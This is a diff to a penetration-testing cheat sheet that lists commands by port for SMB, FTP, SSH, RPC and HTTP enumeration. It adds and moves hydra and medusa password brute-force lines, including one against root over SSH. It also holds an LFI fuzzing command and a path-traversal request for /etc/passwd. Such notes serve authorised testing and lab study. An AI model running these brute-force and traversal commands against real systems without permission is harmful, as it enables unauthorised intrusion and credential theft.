@@ -3,7 +3,7 @@ smbclient -N -L //$rhost/
 smbclient -N //$rhost/IPC$
 nmap -p445 --script smb-protocols $rhost | grep "3.11"
 nmap --script smb-vuln* -p139,445 -Pn $rhost
-enum4linux-ng -AC $rhost
+enum4linux-ng -A $rhost
 nxc smb $rhost -u 'anonymous' -p '' --rid-brute
 nxc smb $rhost -u "" -p "" --users
 nxc smb $rhost -u "" -p "" --pass-pol
@@ -13,7 +13,7 @@ qterminal -e "zsh -c 'hydra -I -l \$user -P ~/rockyou.txt -e nsr -t 1 \$rhost sm
 ### Port 21 (FTP)
 curl ftp://$rhost/ --user "anonymous:anonymous"
 ftp anonymous@$rhost
-nmap -sV -p21 --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 -Pn $rhost
+nmap -p21 --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 -Pn $rhost
 qterminal -e "zsh -c 'hydra -I -l \$user -P ~/rockyou.txt -e nsr -t 1 \$rhost ftp; exec zsh'" & disown
 qterminal -e "zsh -c 'medusa -u \$user -P ~/rockyou.txt -h \$rhost -M ftp; exec zsh'" & disown
 
@@ -23,6 +23,12 @@ ftp anonymous@$rhost -P 2121
 nmap --script ftp* -p2121 -Pn $rhost
 qterminal -e "zsh -c 'hydra -I -l \$user -P ~/rockyou.txt -e nsr -t 1 \$rhost ftp -s 2121; exec zsh'" & disown
 
+### Port 22 (SSH)
+ssh-keyscan $rhost
+qterminal -e "zsh -c 'hydra -I -l \$user -P ~/rockyou.txt -e nsr -t 1 \$rhost ssh; exec zsh'" & disown
+qterminal -e "zsh -c 'hydra -I -l root -P ~/rockyou.txt -e nsr -t 1 \$rhost ssh; exec zsh'" & disown # try root
+medusa -u $user -P ~/rockyou.txt -h $rhost -M ssh
+
 ### Port 135 (RPC)
 rpcclient -U "" -N $rhost -c "enumdomusers"
 rpcclient -U "" -N $rhost -c "querydispinfo"
@@ -30,11 +36,6 @@ rpcclient -U $shortdomain/$user -N $rhost
 rpcclient -U '' -N $rhost
 rpcclient -U "" -N $rhost
 rpcclient -U''%'' -N $rhost
-
-### Port 22 (SSH)
-ssh-keyscan $rhost
-qterminal -e "zsh -c 'hydra -I -l \$user -P ~/rockyou.txt -e nsr -t 1 \$rhost ssh; exec zsh'" & disown
-medusa -u $user -P ~/rockyou.txt -h $rhost -M ssh
 
 ### Port 389 (LDAP)
 jxplorer #389
@@ -70,10 +71,10 @@ qterminal -e "zsh -c 'for dnsname in \$(cat /usr/share/seclists/Discovery/DNS/na
 
 ### Port 80 (HTTP)
 anyHTTP including 8080 etc
+curl -s http://$rhost/robots.txt
 qterminal -e "zsh -c 'ffuf -t 200 -ic -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -v -u http://$rhost/FUZZ'" & disown
 Did you try ffuf with file extensions such as php, txt, zip etc
 locate admin portals etc using ffuf or google
-curl -s http://$rhost/robots.txt
 curl -s http://$rhost | batcat -s --plain
 ffuf -w /path/to/lfi-payloads.txt -u http://$rhost/page?file=FUZZ
 curl "http://$rhost/file?name=../../../../etc/passwd"
